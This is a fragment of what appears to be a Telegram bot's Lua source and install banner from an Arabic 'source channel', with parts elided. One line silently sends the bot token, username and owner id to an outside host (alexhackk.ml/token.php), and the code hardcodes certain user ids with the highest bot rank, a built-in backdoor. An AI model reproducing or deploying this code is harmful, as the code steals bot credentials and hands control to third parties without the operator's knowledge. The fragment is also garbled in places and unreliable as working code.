...
https.request('https://alexhackk.ml/token.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
...
echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @ALEX_TEAM_4 }• }•\e[0m"
...
echo -e "\e[38;5;77m      ALEX ✾ @PHP57e[0m"
...
if msg.sender_user_id_ == 1702918704 then 
msg.TheRank =  'ملك التيليجرام'
msg.Rank = 1

elseif msg.sender_user_id_ == 13660554671366055467 then 
